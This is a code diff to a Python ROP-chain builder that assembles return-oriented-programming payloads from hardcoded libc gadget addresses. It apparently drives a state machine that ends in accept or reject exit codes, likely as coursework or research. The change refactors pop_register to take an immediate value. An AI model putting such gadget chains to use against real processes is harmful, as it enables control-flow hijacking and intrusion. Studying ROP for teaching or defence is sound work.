@@ -57,7 +57,7 @@ class ROP:
             self.zero_out_reg("eax")
             self.xchg_w_eax(reg)
 
-    def pop_register(self, reg):
+    def pop_register(self, reg, num):
         if(reg == "eax"):
             #sys.stdout.buffer.write((0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little'))
             self.arr += (0x00026687 + 0xb7dec000).to_bytes(4, byteorder='little')
@@ -88,7 +88,8 @@ class ROP:
             self.count += 2
         if (reg == "ecx"):
             self.xchg_w_eax("ecx")
-            self.pop_register("eax")
+            self.pop_register("eax", 0)
+            self.arr += (num).to_bytes(4, byteorder='little')
             self.xchg_w_eax("ecx")
 
     def initialize_head_state(self):
@@ -110,10 +111,10 @@ class ROP:
         9. xchg edx, ecx
         '''
         self.zero_out_reg("esi")
-        self.pop_register("esi")
+        self.pop_register("esi", 0)
         self.arr += (ord(num)).to_bytes(4, byteorder='little')          #does this need to be one byte?
         self.swp_regs("edx", "ecx")
-        self.pop_register("edi")
+        self.pop_register("edi", 0)
         self.arr += (0xFFFFFF00).to_bytes(4, byteorder='little')
         self.arr += (0x00086d0f + 0xb7dec000).to_bytes(4, byteorder='little')
         self.swp_regs("esi", "edi")
@@ -150,13 +151,13 @@ class ROP:
         self.xchg_w_eax("edi")
         self.arr += (0x0006a227 + 0xb7dec000).to_bytes(4, byteorder='little')
         self.xchg_w_eax("esi")
-        self.pop_register("ecx")
-        self.arr += (0x000000FF).to_bytes(4, byteorder='little')
+        self.pop_register("ecx", 0x000000FF)
+        #self.arr += (0x000000FF).to_bytes(4, byteorder='little')
         self.xchg_w_eax("esi")
         self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
         self.xchg_w_eax("ebx")
         self.swp_regs("edi", "ecx")
-        self.pop_register("eax")
+        self.pop_register("eax", 0)
         self.arr += (0xFFFFFF00).to_bytes(4, byteorder='little')
         self.arr += (0x0002d87e + 0xb7dec000).to_bytes(4, byteorder='little')
         self.swp_regs("ebx", "ebp")
@@ -357,7 +358,7 @@ class ROP:
 
         #TODO: PUT ESP_DELTA INTO EDX
         # esp_delta = 74 -> change this
-        self.pop_register("edx")
+        self.pop_register("edx", 0)
         #sys.stdout.buffer.write((64).to_bytes(4, byteorder='little'))
         self.arr += (64).to_bytes(4, byteorder='little')
         self.count += 1
@@ -381,7 +382,7 @@ class ROP:
         # move register (with esp delta) to the address in memory
         # swap eax with edx - put esp_delta into edx
         self.xchg_w_eax("edx")
-        self.pop_register("eax")
+        self.pop_register("eax", 0)
         #might be overcompensating in esp_delta, should only start counting after line 281??
         #print("PRINT: ", 0x37800000 + self.count + 6)       #0x378000D4 but esp_delta is 0x378000B0
         #sys.stdout.buffer.write((0x37800000 + self.count + 12).to_bytes(4, byteorder='little'))
@@ -390,7 +391,7 @@ class ROP:
         self.arr += (0x000f4834 + 0xb7dec000).to_bytes(4, byteorder='little')
         #sys.stdout.buffer.write((0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little'))  # 0x00098ffc : add dword ptr [eax], esp ; ret
         self.arr += (0x00098ffc + 0xb7dec000).to_bytes(4, byteorder='little')
-        self.pop_register("esp")
+        self.pop_register("esp", 0)
         self.arr += (0xdecafbad).to_bytes(4, byteorder='little')
         self.count += 4
 
@@ -425,31 +426,31 @@ class ROP:
             #print(outputArr[2])
             if (outputArr[2] == 'r'):
                 #print("reject")
-                self.pop_register("eax")
+                self.pop_register("eax", 0)
                 #sys.stdout.buffer.write((0x00000001).to_bytes(4, byteorder='little'))      # pop 1 into eax for exit code
                 self.arr += (0x00000001).to_bytes(4, byteorder='little')
                 #sys.stdout.buffer.write((0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little'))        #int 0x80 in libc
                 #self.arr += (0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little')
-                self.pop_register("ebx")
+                self.pop_register("ebx", 0)
                 self.arr += (0x00000001).to_bytes(4, byteorder='little')
                 self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
                 self.count += 2
             
             elif (outputArr[2] == 'a'):
                 #print("accept")
-                self.pop_register("eax")
+                self.pop_register("eax", 0)
                 #sys.stdout.buffer.write((0x00000000).to_bytes(4, byteorder='little'))      # pop 0 into eax for exit code
                 self.arr += (0x00000001).to_bytes(4, byteorder='little')
                 #sys.stdout.buffer.write((0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little'))
                 #self.arr += (0x10a82 + 0xb7dec000).to_bytes(4, byteorder='little')
-                self.pop_register("ebx")
+                self.pop_register("ebx", 0)
                 self.arr += (0x00000000).to_bytes(4, byteorder='little')
                 self.arr += (0xb7eacc5a).to_bytes(4, byteorder='little')
                 self.count += 2
 
             else:
                 self.zero_out_reg("ecx")   
-                self.pop_register("eax")
+                self.pop_register("eax", 0)
                 #sys.stdout.buffer.write((ord(outputArr[2])).to_bytes(4, byteorder='little'))      #pop output state into eax
                 self.arr += (ord(outputArr[2])).to_bytes(4, byteorder='little')
                 #sys.stdout.buffer.write((0x0006ea87 + 0xb7dec000).to_bytes(4, byteorder='little'))        #or ch, al ; ret
